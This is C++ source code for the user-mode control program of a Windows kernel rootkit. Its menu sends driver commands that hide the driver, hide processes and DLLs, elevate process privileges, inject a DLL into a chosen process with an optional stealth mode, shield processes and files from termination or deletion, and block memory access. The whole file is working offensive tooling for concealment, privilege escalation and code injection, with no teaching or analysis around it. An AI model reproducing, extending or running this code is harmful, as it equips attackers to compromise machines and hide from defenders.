#include <iostream>
#include <string>
#include <Windows.h>
#include <sstream>
#define SHARED_MEM_SIZE 512
#define SECTION_NAME L"MySharedSection"
#define EVENT_NAME   L"MySharedEvent"

typedef struct _ADDRESS_RANGE {
    UINT64 Start;
    UINT64 End;
} ADDRESS_RANGE;

namespace Rootkit {
    namespace codes {
        // CTL Codes to communicate with User Mode application.
        constexpr ULONG HideDriver =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x696, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG ElevateProcess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x697, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG HideProcess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x698, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG ProtectProcess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x699, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG HideDLL =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x700, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG UnProtectProcess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x701, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG ProtectProcessOP =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x702, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG UnProtectProcessOP =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x703, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG ProtectFile =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x704, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG UnProtectFile =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x705, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG DisableProtectionToAll =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x706, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        /*(
        constexpr ULONG HideFile =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x707, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
            */
        constexpr ULONG InjectDLL =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x708, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG BlockAddress =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x709, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG BlockPIDAccess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x710, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG DeleteAllHooks =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
    }

    struct Request {
        HANDLE process_id;
        WCHAR DLLName[256];
        WCHAR Path[MAX_PATH];
        WCHAR Filename[256];
        ADDRESS_RANGE addressToBlock;
        bool stealth;
    };


    bool HideTheDriver(HANDLE driver_handle) {
        DWORD bytes_returned = 0;
        Request r;
        r.process_id = UlongToHandle(0);
        // Properly declare all parameters for DeviceIoControl
        return DeviceIoControl(
            driver_handle,                // Handle to device
            codes::HideDriver,            // Control code
            &r,                      // Input buffer
            sizeof(r),                           // Input buffer size
            &r,                      // Output buffer
            sizeof(r),                           // Output buffer size
            &bytes_returned,             // Bytes returned
            nullptr                      // Overlapped
        );

    }

    bool DisableProcessEnum(HANDLE driver_handle, UINT32 PID) {
        Request r;
        r.process_id = UlongToHandle(PID);
        return DeviceIoControl(
            driver_handle,
            codes::BlockPIDAccess,
            &r,
            sizeof(r),
            &r,
            sizeof(r),
            nullptr,
            nullptr
        );
    }

    /*
    bool HideFile(HANDLE driver_handle, WCHAR* Path) {
        Request req = {};
        DWORD ret = 0;

        // Safe copy
        wcsncpy_s(req.Path, _countof(req.Path), Path, _TRUNCATE);

        // Send only input (no output buffer)
        return DeviceIoControl(
            driver_handle,
            Rootkit::codes::HideFile,
            &req,
            sizeof(req),
            nullptr,        // <-- no output buffer
            0,              // <-- size 0
            &ret,
            nullptr
        );
    }
    */
    /*
    bool HookNtCreateFile(HANDLE driver_handle) {
        Request r;
        r.process_id = UlongToHandle(0);
        return DeviceIoControl(
            driver_handle,
            codes::HookNtCreateFile,
            &r,
            sizeof(r),
            &r,
            sizeof(r),
            nullptr,
            nullptr
        );
    }
    */



    bool DeleteAllHooks(HANDLE driver_handle) {
        Request r;
        r.process_id = UlongToHandle(0);
        return DeviceIoControl(
            driver_handle,
            codes::DeleteAllHooks,
            &r,
            sizeof(r),
            &r,
            sizeof(r),
            nullptr,
            nullptr
        );
    }

    bool BlockAddress(HANDLE driver_handle, UINT32 PID) {
        DWORD bytes_returned = 0;
        // Properly declare all parameters for DeviceIoControl
        Request r;
        r.process_id = UlongToHandle(PID);
        return DeviceIoControl(
            driver_handle,
            codes::BlockAddress,
            &r,
            sizeof(r),
            &r,
            sizeof(r),
            nullptr,
            nullptr
        );

    }

    bool InjectDLL(HANDLE driver_handle, WCHAR* path, DWORD pid, bool stealth) {
        Request r;
        r.process_id = UlongToHandle(pid);
        if (stealth) {
            r.stealth = true;
        }
        // Correct copy into Path
        wcsncpy_s(
            r.Path,
            _countof(r.Path),        // size of r.Path in WCHARs
            path,                    // source
            _TRUNCATE                // max to copy
        );
        return DeviceIoControl(
            driver_handle,
            codes::InjectDLL,
            &r,
            sizeof(r),
            &r,
            sizeof(r),
            nullptr,
            nullptr
        );
    }

    bool UnProtectProcessOP(HANDLE driver_handle, DWORD pid) {
        Request r;
        r.process_id = UlongToHandle(pid);
        return DeviceIoControl(
            driver_handle,
            codes::UnProtectProcessOP,
            &r,
            sizeof(r),
            &r,
            sizeof(r),
            nullptr,
            nullptr
        );
    }

    bool ProtectProcessOP(HANDLE driver_handle, DWORD pid) {
        Request r;
        r.process_id = UlongToHandle(pid);
        return DeviceIoControl(
            driver_handle,
            codes::ProtectProcessOP,
            &r,
            sizeof(r),
            &r,
            sizeof(r),
            nullptr,
            nullptr
        );
    }

    bool UnProtectProcess(HANDLE driver_handle, DWORD pid) {
        Request r;
        r.process_id = ULongToHandle(pid);
        // protecc
        return DeviceIoControl(
            driver_handle,
            codes::UnProtectProcess,
            &r,
            sizeof(r),
            &r,
            sizeof(r),
            nullptr,
            nullptr
        );
    }

    bool HideDLL(HANDLE driver_handle, DWORD pid, WCHAR* DLLName) {
        Request r;
        r.process_id = UlongToHandle(pid);
        wcsncpy_s(
            r.DLLName,
            _countof(r.DLLName),
            DLLName,
            _TRUNCATE
        );
        return DeviceIoControl(
            driver_handle,
            codes::HideDLL,
            &r,
            sizeof(r),
            &r,
            sizeof(r),
            nullptr,
            nullptr
        );
    }

    bool ProtectFile(HANDLE driver_handle, WCHAR* Path) {
        Request req = {};
        DWORD ret = 0;

        // Safe copy
        wcsncpy_s(req.Path, _countof(req.Path), Path, _TRUNCATE);

        // Send only input (no output buffer)
        return DeviceIoControl(
            driver_handle,
            Rootkit::codes::ProtectFile,
            &req,
            sizeof(req),
            nullptr,        // <-- no output buffer
            0,              // <-- size 0
            &ret,
            nullptr
        );
    }

    bool UnProtectFile(HANDLE driver_handle, WCHAR* Path) {
        Request req = {};
        DWORD ret = 0;

        // Safe copy
        wcsncpy_s(req.Path, _countof(req.Path), Path, _TRUNCATE);

        // Send only input (no output buffer)
        return DeviceIoControl(
            driver_handle,
            Rootkit::codes::UnProtectFile,
            &req,
            sizeof(req),
            nullptr,        // <-- no output buffer
            0,              // <-- size 0
            &ret,
            nullptr
        );
    }

    bool ClearFileProtections(HANDLE driver_handle) {
        return DeviceIoControl(
            driver_handle,
            Rootkit::codes::DisableProtectionToAll,
            nullptr,
            NULL,
            nullptr,
            NULL,
            nullptr,
            nullptr
        );
    }

    bool ElevateProcess(HANDLE driver_handle, DWORD pid) {
        Request r;
        r.process_id = ULongToHandle(pid);


        return DeviceIoControl(
            driver_handle,
            codes::ElevateProcess,
            &r,
            sizeof(r),
            &r,
            sizeof(r),
            nullptr,
            nullptr
        );
    }

    bool ProtectProcess(HANDLE driver_handle, DWORD pid) {
        Request r;
        r.process_id = ULongToHandle(pid);
        // protecc
        return DeviceIoControl(
            driver_handle,
            codes::ProtectProcess,
            &r,
            sizeof(r),
            &r,
            sizeof(r),
            nullptr,
            nullptr
        );
    }

    bool HideProcess(HANDLE driver_handle, DWORD pid) {
        // Use our structure
        Request r;
        // Convert the DWORD to a HANDLE
        r.process_id = ULongToHandle(pid);
        // Send.
        return DeviceIoControl(
            driver_handle,
            codes::HideProcess,
            &r,
            sizeof(r),
            &r,
            sizeof(r),
            nullptr,
            nullptr
        );
    }
}
std::string g_MsgFromKernel;


bool AskForStealth() {
    std::wstring response;

    while (true) {
        std::wcout << L"Would you like to enable the stealth version (hides the DLL from the process PEB)? Yes/No: ";
        std::getline(std::wcin, response);

        // Convert to lowercase
        for (auto& ch : response) ch = towlower(ch);

        if (response == L"yes" || response == L"y")
            return true;
        else if (response == L"no" || response == L"n")
            return false;
        else
            std::wcout << L"[!] Invalid input. Please type Yes or No.\n";
    }
}
ADDRESS_RANGE ReadHexAddressRange() {
    std::string input;
    std::getline(std::cin, input);  // read whole line, including '-'

    // Find the dash separator
    size_t dashPos = input.find('-');
    if (dashPos == std::string::npos) {
        // No dash found — handle error or assume Start=End=input?
        std::cerr << "Invalid input format, expected start-end\n";
        return { 0, 0 };
    }

    // Extract start and end substrings
    std::string startStr = input.substr(0, dashPos);
    std::string endStr = input.substr(dashPos + 1);

    // Helper lambda to parse single hex string to UINT64
    auto parseHex = [](const std::string& str) -> UINT64 {
        std::string s = str;
        // Remove 0x/0X prefix if present
        if (s.find("0x") == 0 || s.find("0X") == 0)
            s = s.substr(2);
        UINT64 val = 0;
        std::stringstream ss;
        ss << std::hex << s;
        ss >> val;
        return val;
        };

    UINT64 startVal = parseHex(startStr);
    UINT64 endVal = parseHex(endStr);

    return { startVal, endVal };
}

void showMenu() {
    int pid = GetCurrentProcessId();
    std::cout << "===== User Mode Menu =====\n";
    std::cout << "1. Hide Driver\n";
    std::cout << "2. Elevate Process\n";
    std::cout << "3. Hide Process\n";
    std::cout << "4. Protect Process\n";
    std::cout << "5. Hide DLL from process\n";
    std::cout << "6. File Protection Menu\n";
    std::cout << "7. DLL Injector\n";
    std::cout << "8. Hooking Utils\n";
    std::cout << "99. Exit\n";
    std::cout << "Current PID: " << pid << std::endl;
    if (!g_MsgFromKernel.empty() && g_MsgFromKernel[0] != '\0') {
        // Print out the last message recorded from the kernel.
        std::cout << "Last message from the Kernel: " << g_MsgFromKernel << std::endl;
    }
    std::cout << "=======================\n";
    std::cout << "Enter your choice: ";
}

int main() {
    std::cout << "Starting user mode program...\n";
    bool service = false;
    std::cout << "Have you started the reflective or service version of the driver?\n\n";
    std::cout << "1. Reflective Version (RootkitReflective.sys)\n";
    std::cout << "2. Service Version (RootkitService.sys)\n";
    int c = -1;
    std::cin >> c;
    switch (c) {
    case 1:
        service = false;
        break;
    case 2:
        service = true;
        break;
    default:
        std::cout << "Invalid Choice...\n";
        return 1;
    }

    // Request more comprehensive access rights
    const HANDLE driver_handle = CreateFile(
        L"\\\\.\\rootkit",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if (driver_handle == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        std::cout << "Failed to create driver handle. Error code: " << error << std::endl;
        switch (error) {
        case ERROR_ACCESS_DENIED:
            std::cout << "Access denied. Try running as Administrator.\n";
            break;
        case ERROR_FILE_NOT_FOUND:
            std::cout << "Driver device not found. Ensure driver is loaded. (Try to run as admin anyway, worked for me the last time.)\n";
            break;
        default:
            std::cout << "Unknown error occurred.\n";
        }
        return 1;
    }

    std::cout << "Got a driver handle!\n";

    HANDLE hSection = NULL;
    LPVOID pView = NULL;
    HANDLE hEvent = NULL;

    if (service) {
        hSection = OpenFileMapping(FILE_MAP_READ, FALSE, L"Global\\MySharedSection");
        if (!hSection) {
            printf("[-] Failed to open shared memory: %lu\n", GetLastError());
            return 1;
        }
    }

    if (service) {
        pView = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, SHARED_MEM_SIZE);
        if (!pView) {
            printf("[-] Failed to map view: %lu\n", GetLastError());
            return 1;
        }
    }

    if (service) {
        hEvent = OpenEvent(SYNCHRONIZE, FALSE, L"Global\\MySharedEvent");
        if (!hEvent) {
            printf("[-] Failed to open event: %lu\n", GetLastError());
            return 1;
        }
    }
    // Move all variable declarations here before the switch
    int choice;
    int pid;
    int pidHide;
    int pidProtect;
    int pidDLLHide;
    int choiceProtect;
    int choiceFileProtect;
    bool enabled = true;
    WCHAR DLLName[256];
    WCHAR Path[MAX_PATH];
    std::wstring tempDLLName;
    WCHAR FilePath[MAX_PATH];
    UINT64 addressToBlock;
    while (true) {
        showMenu();
        std::cin >> choice;

        switch (choice) {
        case 1: {
            std::cout << "[!] Sending Message to Driver.\n";
            Rootkit::HideTheDriver(driver_handle);
            if (service) {
                std::cout << "[+] Waiting for message from kernel...\n";
                WaitForSingleObject(hEvent, 10000);
                if (pView && ((char*)pView)[0] != '\0') {
                    printf("[+] Message From Kernel: %s\n", (char*)pView);
                    g_MsgFromKernel = std::string((char*)pView);
                }
                else {
                    printf("No message has been received from the kernel...\n");
                }
            }
            Sleep(5000);
            system("cls");
            break;
        }
        case 2: {
            std::cout << "Enter a PID: ";
            std::cin >> pid;
            std::cout << "[!] Sending Message to Driver.\n";
            Rootkit::ElevateProcess(driver_handle, pid);
            if (service) {
                std::cout << "[+] Waiting for message from kernel...\n";
                WaitForSingleObject(hEvent, 10000);
                if (pView && ((char*)pView)[0] != '\0') {
                    printf("[+] Message From Kernel: %s\n", (char*)pView);
                    g_MsgFromKernel = std::string((char*)pView);
                }
                else {
                    printf("No message has been received from the kernel...\n");
                }
            }
            Sleep(5000);
            system("cls");
            break;
        }
        case 3: {
            std::cout << "Enter a PID: ";
            std::cin >> pidHide;
            std::cout << "[!] Sending Message to Driver.\n";
            Rootkit::HideProcess(driver_handle, pidHide);
            if (service) {
                std::cout << "[+] Waiting for message from kernel...\n";
                WaitForSingleObject(hEvent, 10000);
                if (pView && ((char*)pView)[0] != '\0') {
                    printf("[+] Message From Kernel: %s\n", (char*)pView);
                    g_MsgFromKernel = std::string((char*)pView);
                }
                else {
                    printf("No message has been received from the kernel...\n");
                }
            }
            Sleep(5000);
            system("cls");
            break;
        }
        case 4: {
            if (!enabled) {
                enabled = !enabled;
            }
            while (enabled) { // Use a dedicated loop for the process protection menu
                system("cls");
                std::cout << "=== Process Protection Menu ===\n";
                std::cout << "1) Enable Protection (Standard)\n";
                std::cout << "2) Disable Protection (Standard)\n";
                std::cout << "3) Enable Protection (Kernel Callback Method) [No BSOD]\n";
                std::cout << "    Enter '99' for a detailed explanation\n";
                std::cout << "4) Disable Protection (Kernel Callback Method)\n";
                std::cout << "5) Return to Main Menu\n"; // Add an option to return to the main menu
                std::cout << "===============================\n";
                std::cout << "Enter a choice: ";
                std::cin >> choiceProtect;

                switch (choiceProtect) {
                case 1:
                    std::cout << "Enter a PID: ";
                    std::cin >> pidProtect;
                    std::cout << "[!] Sending Message to Driver.\n";
                    Rootkit::ProtectProcess(driver_handle, pidProtect);
                    if (service) {
                        std::cout << "[+] Waiting for message from kernel...\n";
                        WaitForSingleObject(hEvent, 10000);
                        if (pView && ((char*)pView)[0] != '\0') {
                            printf("[+] Message From Kernel: %s\n", (char*)pView);
                            g_MsgFromKernel = std::string((char*)pView);
                        }
                        else {
                            printf("No message has been received from the kernel...\n");
                        }
                    }
                    Sleep(5000);
                    break;
                case 2:
                    std::cout << "Enter a PID: ";
                    std::cin >> pidProtect;
                    std::cout << "[!] Sending Message to Driver.\n";
                    Rootkit::UnProtectProcess(driver_handle, pidProtect);
                    if (service) {
                        std::cout << "[+] Waiting for message from kernel...\n";
                        WaitForSingleObject(hEvent, 10000);
                        if (pView && ((char*)pView)[0] != '\0') {
                            printf("[+] Message From Kernel: %s\n", (char*)pView);
                            g_MsgFromKernel = std::string((char*)pView);
                        }
                        else {
                            printf("No message has been received from the kernel...\n");
                        }
                    }
                    Sleep(5000);
                    break;
                case 3:
                    std::cout << "Enter a PID: ";
                    std::cin >> pidProtect;
                    std::cout << "[!] Sending Message to Driver.\n";
                    Rootkit::ProtectProcessOP(driver_handle, pidProtect);
                    if (service) {
                        std::cout << "[+] Waiting for message from kernel...\n";
                        WaitForSingleObject(hEvent, 10000);
                        if (pView && ((char*)pView)[0] != '\0') {
                            printf("[+] Message From Kernel: %s\n", (char*)pView);
                            g_MsgFromKernel = std::string((char*)pView);
                        }
                        else {
                            printf("No message has been received from the kernel...\n");
                        }
                    }
                    Sleep(5000);
                    break;
                case 4:
                    std::cout << "Enter a PID: ";
                    std::cin >> pidProtect;
                    std::cout << "[!] Sending Message to Driver.\n";
                    Rootkit::UnProtectProcessOP(driver_handle, pidProtect);
                    if (service) {
                        std::cout << "[+] Waiting for message from kernel...\n";
                        WaitForSingleObject(hEvent, 10000);
                        if (pView && ((char*)pView)[0] != '\0') {
                            printf("[+] Message From Kernel: %s\n", (char*)pView);
                            g_MsgFromKernel = std::string((char*)pView);
                        }
                        else {
                            printf("No message has been received from the kernel...\n");
                        }
                    }
                    Sleep(5000);
                    break;
                case 99:
                    system("cls");
                    std::cout << "The Kernel Callback method intercepts termination and memory-access attempts.\n";
                    std::cout << "Any unauthorized terminate/read/write calls will receive ACCESS_DENIED\n";
                    std::cout << "rather than crashing the system.\n\n";
                    std::cout << "Returning to the process protection menu in 10 seconds...\n";
                    Sleep(10000);
                    break;
                case 5: // Handle returning to the main menu
                    system("cls");
                    enabled = !enabled;
                    break;
                default:
                    std::cout << "Invalid Choice. Please try again.\n";
                    Sleep(2000);
                    break;
                }
            }
            break;
        }
        case 5: {
            std::wcin.ignore(); // Clear any leftover input in the stream
            std::wcout << L"Enter a PID: ";
            std::cin >> pidDLLHide;
            std::wcout << L"\nEnter the DLL name you wish to hide (e.g., example.dll): ";
            std::wcin >> tempDLLName;
            // Check and append .dll if missing
            if (tempDLLName.length() < 4 || tempDLLName.substr(tempDLLName.length() - 4) != L".dll") {
                tempDLLName += L".dll";
            }
            wcsncpy_s(DLLName, tempDLLName.c_str(), _TRUNCATE);
            std::wcout << L"[!] Sending Message to Driver.\n";
            Rootkit::HideDLL(driver_handle, pidDLLHide, DLLName);
            if (service) {
                std::cout << "[+] Waiting for message from kernel...\n";
                WaitForSingleObject(hEvent, 10000);
                if (pView && ((char*)pView)[0] != '\0') {
                    printf("[+] Message From Kernel: %s\n", (char*)pView);
                    g_MsgFromKernel = std::string((char*)pView);
                }
                else {
                    printf("No message has been received from the kernel...\n");
                }
            }
            Sleep(5000);
            system("cls");
            break;
        }
        case 6: { // File Protection Menu
            bool fileMenuEnabled = true;
            while (fileMenuEnabled) {
                system("cls");
                std::cout << "=== File Protection Menu ===\n";
                std::cout << "1) Enable File Protection (Prevents Deletion)\n";
                std::cout << "2) Disable File Protection (Allows Deletion)\n";
                std::cout << "3) Clear All File Protections\n";
                std::cout << "------> Enter '99' for a detailed explanation\n";
                std::cout << "4) Return to Main Menu\n";
                std::cout << "===========================\n";
                std::cout << "Enter a choice: ";
                std::cin >> choiceFileProtect;

                switch (choiceFileProtect) {
                case 1:
                    std::wcin.ignore();
                    std::wcout << L"Enter a full file path to protect (e.g., C:\\Users\\User\\Desktop\\File.txt): ";
                    std::wcin.getline(FilePath, MAX_PATH);
                    std::wcout << L"[!] Sending Message to Driver.\n";
                    Rootkit::ProtectFile(driver_handle, FilePath);
                    if (service) {
                        std::cout << "[+] Waiting for message from kernel...\n";
                        WaitForSingleObject(hEvent, 10000);
                        if (pView && ((char*)pView)[0] != '\0') {
                            printf("[+] Message From Kernel: %s\n", (char*)pView);
                            g_MsgFromKernel = std::string((char*)pView);
                        }
                        else {
                            printf("No message has been received from the kernel...\n");
                        }
                    }
                    Sleep(5000);
                    break;
                case 2:
                    std::wcin.ignore();
                    std::wcout << L"Enter a full file path to unprotect (e.g., C:\\Users\\User\\Desktop\\File.txt): ";
                    std::wcin.getline(FilePath, MAX_PATH);
                    std::wcout << L"[!] Sending Message to Driver.\n";
                    Rootkit::UnProtectFile(driver_handle, FilePath);
                    if (service) {
                        std::cout << "[+] Waiting for message from kernel...\n";
                        WaitForSingleObject(hEvent, 10000);
                        if (pView && ((char*)pView)[0] != '\0') {
                            printf("[+] Message From Kernel: %s\n", (char*)pView);
                            g_MsgFromKernel = std::string((char*)pView);
                        }
                        else {
                            printf("No message has been received from the kernel...\n");
                        }
                    }
                    Sleep(5000);
                    break;
                case 3:
                    std::cout << "[!] Sending request to clear all file protections.\n";
                    Rootkit::ClearFileProtections(driver_handle);
                    std::cout << "[+] Waiting for message from kernel...\n";
                    if (service) {
                        std::cout << "[+] Waiting for message from kernel...\n";
                        WaitForSingleObject(hEvent, 10000);
                        if (pView && ((char*)pView)[0] != '\0') {
                            printf("[+] Message From Kernel: %s\n", (char*)pView);
                            g_MsgFromKernel = std::string((char*)pView);
                        }
                        else {
                            printf("No message has been received from the kernel...\n");
                        }
                    }
                    Sleep(5000);
                    break;
                case 99:
                    system("cls");
                    std::cout << "File Protection Explanation:\n";
                    std::cout << "1) Enable File Protection: Prevents the specified file from being deleted or modified.\n";
                    std::cout << "2) Disable File Protection: Removes protection, allowing the file to be deleted or modified.\n";
                    std::cout << "3) Clear All File Protections: Removes protection from all files previously protected by the driver.\n";
                    std::cout << "This feature is useful for safeguarding critical files from tampering or accidental deletion.\n\n";
                    std::cout << "Returning to the file protection menu in 10 seconds...\n";
                    Sleep(10000);
                    break;
                case 4:
                    system("cls");
                    fileMenuEnabled = false;
                    break;
                default:
                    std::cout << "Invalid Choice. Please try again.\n";
                    Sleep(2000);
                    break;
                }
            }
            break;
        }
        
        case 7: {
            std::wcin.ignore();
            std::wcout << L"Enter a full DLL path (e.g., C:\\Users\\User\\Desktop\\mal.dll): ";
            std::wcin.getline(FilePath, MAX_PATH);
            std::wcout << L"Enter a PID: ";
            std::cin >> pid;
            std::cin.ignore();
            bool stealth = AskForStealth();
            std::wcout << L"[!] Sending Message to Driver.\n";
            Rootkit::InjectDLL(driver_handle, FilePath, pid, stealth);
            if (service) {
                std::cout << "[+] Waiting for message from kernel...\n";
                WaitForSingleObject(hEvent, 10000);
                if (pView && ((char*)pView)[0] != '\0') {
                    printf("[+] Message From Kernel: %s\n", (char*)pView);
                    g_MsgFromKernel = std::string((char*)pView);
                }
                else {
                    printf("No message has been received from the kernel...\n");
                }
            }
            Sleep(5000);
            break;
        }
        case 8: {
            if (!enabled) {
                enabled = !enabled;
            }
            while (enabled) {
                system("cls");
                std::cout << "=== HOOKING UTILS ===\n";
                std::cout << "1. Block Address Access for a PID.\n";
                std::cout << "2. Disable Process Enumeration -- Disables PsLookupProcessByProcessId for the PID -- NOTE: ANY KERNEL FUNCTION THAT USES THIS WONT BE ABLE TO INTERACT WITH THE PROCESS, Including this rootkit.\n";
                std::cout << "3. Delete all hooks and revert.\n";
                std::cout << "===========================\n";
                std::cout << "Enter a choice: ";
                std::cin >> choiceProtect;

                switch (choiceProtect) {
                case 1:
                    std::cout << "Enter the PID to block memory access for: ";
                    std::cin >> pidProtect;
                    Rootkit::BlockAddress(driver_handle, pidProtect);
                    Sleep(5000);
                    break;
                case 2:
                    std::wcin.ignore();
                    std::cout << "Enter a PID: ";
                    std::cin >> pidProtect;
                    Rootkit::DisableProcessEnum(driver_handle, pidProtect);
                    Sleep(5000);
                    break;
                case 3:
                    std::wcout << L"\n[!] Sending Message to Driver.\n";
                    Rootkit::DeleteAllHooks(driver_handle);
                    Sleep(5000);
                    break;
                }
            }
        }
        case 99: {
            std::cout << "Exiting the program, bye!\n";
            CloseHandle(driver_handle);
            if (service) {
                UnmapViewOfFile(pView);
                CloseHandle(hSection);
                CloseHandle(hEvent);
            }
            return 0;
        }
        default: {
            std::cout << "Invalid Choice.\n";
            Sleep(2000);
            system("cls");
            break;
        }
               Sleep(2000);
               system("cls");
        }
    }
}